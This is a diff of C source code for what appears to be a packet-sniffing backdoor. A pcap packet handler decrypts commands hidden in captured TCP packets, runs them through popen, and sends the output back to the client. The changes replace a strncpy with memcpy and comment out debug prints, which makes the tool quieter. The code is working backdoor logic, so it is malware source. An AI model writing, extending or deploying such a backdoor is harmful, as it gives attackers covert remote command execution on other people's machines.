@@ -317,7 +317,7 @@ int send_datagram(struct addr_info *user_addr, char *data, int data_len){
    
     /* Data */
     
-    strncpy(data_ptr, data, data_len);
+    memcpy(data_ptr, data, data_len);
       
     /* Calculate Checksum */
     
@@ -363,7 +363,7 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
     /* Parse packet */
     
     // Print its length
-	printf("Jacked a packet with length of [%d]\n", header->len);
+	//printf("Jacked a packet with length of [%d]\n", header->len);
     
     // Get packet info
     struct tcp_ip_packet packet_info;
@@ -371,26 +371,26 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
         //printf("tcp_ip_typecast");
         return;
     }
-    printf("Payload (len:%zu): %s\n", strlen((char *)packet_info.payload), packet_info.payload);
     
     /* Decrypt remaining packet data */
     
     short payload_len = ntohs(packet_info.ip->ip_len) - sizeof(struct iphdr) - sizeof(struct tcphdr);
-    printf("payload_len: %d\n",payload_len);
+    //printf("payload_len: %d\n",payload_len);
     char *bd_command;
     bd_command = bd_decrypt((char *)packet_info.payload, payload_len);
     if(bd_command == NULL){
         return;
     }
     
-    // Execute command
+    /* Execute command */
+    
     FILE *fp;
     fp = popen(bd_command, "r");
     if(fp == NULL){
         printf("Command error!\n");
         return;
     }
-    printf("Command executed.\n");  
+    printf("Command executed.\n");
     
     /* Send results back to client */
     
